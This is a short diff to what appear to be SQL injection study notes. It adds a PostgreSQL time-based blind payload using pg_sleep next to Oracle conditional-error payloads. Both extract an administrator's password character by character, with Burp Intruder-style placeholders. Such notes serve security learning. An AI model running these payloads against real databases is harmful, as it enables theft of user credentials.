@@ -78,6 +78,8 @@ if data is not directly returned in the response, we can trigger conditional err
 ```
 ' UNION SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE ' ' END FROM users WHERE username='administrator'-- -
 ' UNION SELECT CASE WHEN SUBSTR(password,§1§,1)='§char§' THEN TO_CHAR(1/0) ELSE ' ' END FROM users WHERE username='administrator'-- - cluster bomb with number list and bruteforcer
+
+select case when substring(password,§1§,1)='§char§' then pg_sleep(5) else pg_sleep(0) end from users where username='admin' -- PostgreSQL
 ```
 
 # Data exfiltration
